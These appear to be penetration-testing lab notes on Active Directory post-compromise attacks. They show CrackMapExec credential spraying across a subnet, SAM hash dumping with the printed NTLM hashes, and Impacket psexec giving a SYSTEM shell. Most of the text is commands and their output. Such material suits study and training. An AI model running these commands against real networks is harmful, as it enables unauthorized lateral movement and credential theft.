# Post-Compromise Attacks

## Pass the hash

### CrackMapExec
- Install: `sudo apt install crackmapexec`
- Pass the password on the domain: `crackmapexec smb 10.0.2.0/24 -u fcastle -d DOMAIN.local -p Password1` If the password is the same for another machine in the network we will get ownership on this new machine too
```
┌──(root💀kali)-[~kali]
└─# crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1
SMB         10.0.2.5        445    HYDRA-DC         [*] Windows 10.0 Build 17763 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         10.0.2.4        445    THEDEFENDER      [*] Windows 10.0 Build 19041 x64 (name:THEDEFENDER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         10.0.2.5        445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         10.0.2.4        445    THEDEFENDER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         10.0.2.15       445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
```
- We can also add --sam to the previous command to dump the sam file here we got 5 sam hashes
```
┌──(root💀kali)-[~kali]
└─# crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
SMB         10.0.2.15       445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         10.0.2.5        445    HYDRA-DC         [*] Windows 10.0 Build 17763 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         10.0.2.4        445    THEDEFENDER      [*] Windows 10.0 Build 19041 x64 (name:THEDEFENDER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         10.0.2.15       445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         10.0.2.5        445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         10.0.2.4        445    THEDEFENDER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         10.0.2.15       445    THEPUNISHER      [+] Dumping SAM hashes
SMB         10.0.2.4        445    THEDEFENDER      [+] Dumping SAM hashes
SMB         10.0.2.15       445    THEPUNISHER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.4        445    THEDEFENDER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.15       445    THEPUNISHER      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.4        445    THEDEFENDER      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.15       445    THEPUNISHER      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.4        445    THEDEFENDER      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.2.15       445    THEPUNISHER      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e6cedee56d27d175f48042b53cb6b242:::
SMB         10.0.2.15       445    THEPUNISHER      Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.0.2.15       445    THEPUNISHER      [+] Added 5 SAM hashes to the database
SMB         10.0.2.4        445    THEDEFENDER      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:25e61d7e5702c678e3be8711c03b7837:::
SMB         10.0.2.4        445    THEDEFENDER      Jessica Jones:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.0.2.4        445    THEDEFENDER      [+] Added 5 SAM hashes to the database
```

### psexec
We can also use psexec to try to get a shell on the other machine
```
┌──(root💀kali)-[~kali]
└─# psexec.py marvel/fcastle:Password1@10.0.2.4
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.0.2.4.....
[*] Found writable share ADMIN$
[*] Uploading file IEoFnNEZ.exe
[*] Opening SVCManager on 10.0.2.4.....
[*] Creating service YXVX on 10.0.2.4.....
[*] Starting service YXVX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
THEDEFENDER
```
